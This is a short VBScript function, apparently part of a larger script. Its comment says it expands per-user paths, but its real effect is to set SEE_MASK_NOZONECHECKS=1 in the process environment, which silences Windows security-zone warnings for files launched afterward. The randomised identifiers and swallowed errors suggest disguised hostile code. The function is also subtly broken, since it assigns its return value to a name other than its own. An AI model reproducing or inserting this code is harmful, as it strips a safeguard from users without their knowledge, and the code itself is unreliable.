' ExpandEnvironmentStrings for per-user paths
Function LoadProfileSegment85()
On Error Resume Next
  Dim strKey93,strEntry24,strProfile90
  Set strKey93=CreateObject("WScript.Shell")
  strEntry24=strKey93.ExpandEnvironmentStrings("%TEMP%")
  strProfile90=strKey93.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strEntry24)>0 And Len(strProfile90)>0 Then
    strKey93.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    MergeProfileDelta51=1
    Exit Function
  End If
  MergeProfileDelta51=0
End Function

